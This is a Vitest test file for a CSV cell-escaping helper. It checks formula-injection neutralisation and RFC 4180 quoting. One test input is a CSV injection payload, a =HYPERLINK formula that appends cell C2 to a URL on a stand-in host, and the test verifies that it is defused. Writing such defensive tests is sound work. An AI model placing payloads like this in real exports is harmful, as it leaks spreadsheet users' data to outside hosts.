import { describe, it, expect } from 'vitest';
import { csvCell, csvRow } from './csv.js';

describe('csvCell', () => {
  it('neutralizes a leading formula trigger (OWASP CSV injection)', () => {
    for (const t of ['=', '+', '-', '@', '\t', '\r']) {
      expect(csvCell(`${t}cmd`).replace(/^"/, '')).toMatch(/^'/);
    }
    expect(csvCell('=HYPERLINK("https://x.example/?"&C2,"open")'))
      .toBe(`"'=HYPERLINK(""https://x.example/?""&C2,""open"")"`);
  });

  it('leaves ordinary text and numbers alone', () => {
    expect(csvCell('Jane Doe')).toBe('Jane Doe');
    expect(csvCell('a-b')).toBe('a-b');
    expect(csvCell(-12.5)).toBe('-12.5');
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('quotes per RFC 4180', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('x\ny')).toBe('"x\ny"');
    expect(csvCell('x\ry')).toBe('"x\ry"');
  });

  it('csvRow joins escaped cells', () => {
    expect(csvRow(['a', '@b', 3, null])).toBe("a,'@b,3,");
  });
});
